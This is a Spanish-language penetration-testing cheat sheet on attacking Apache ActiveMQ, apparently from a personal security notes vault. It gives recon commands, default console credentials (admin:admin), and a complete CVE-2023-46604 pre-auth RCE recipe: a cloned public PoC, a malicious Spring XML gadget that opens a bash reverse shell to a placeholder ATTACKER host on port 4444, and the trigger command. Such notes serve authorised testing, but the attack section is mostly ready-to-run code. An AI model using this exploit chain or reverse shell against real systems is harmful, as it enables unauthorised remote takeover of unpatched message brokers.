---
aliases:
  - "pipelines"
  - Apache ActiveMQ
  - CVE-2023-46604
tags:
  - asset/web-app
  - technique/execution
kind: CheatSheet
linked:
---
# ActiveMQ

> [!info]
> **Apache ActiveMQ** — message broker JMS. Puerto OpenWire default **61616**. CVE-2023-46604 (CVSS 10.0): RCE pre-auth via deserialization de mensajes OpenWire.

---

## Recon

```bash
# Port + version
nmap -p 61616 -sV <target>

# Web console (a veces expuesta también)
curl http://<target>:8161/admin/
# Default creds: admin:admin
```

---

## CVE-2023-46604 (RCE pre-auth)

Versiones vulnerables: ActiveMQ < 5.15.16, 5.16.0-5.16.7, 5.17.0-5.17.6, 5.18.0-5.18.3.

```bash
# PoC público
git clone https://github.com/X1r0z/ActiveMQ-RCE
cd ActiveMQ-RCE

# Servidor que sirve XML malicioso (Spring ClassPathXmlApplicationContext gadget)
python3 -m http.server 8888

# poc.xml
cat > poc.xml <<EOF
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>bash -i >&amp; /dev/tcp/ATTACKER/4444 0>&amp;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
EOF

# Trigger
./ActiveMQ-RCE -i <target> -p 61616 -u http://attacker:8888/poc.xml
```

---

## Otros vectores

- Default creds web console (`admin:admin`) → upload XML config → RCE
- Auth bypass CVE-2022-41678
- JMX management port (1099)

---

## Notas Relacionadas

- [[Insecure Deserialization]]
- [[Log4J]]
- [[Default credentials]]
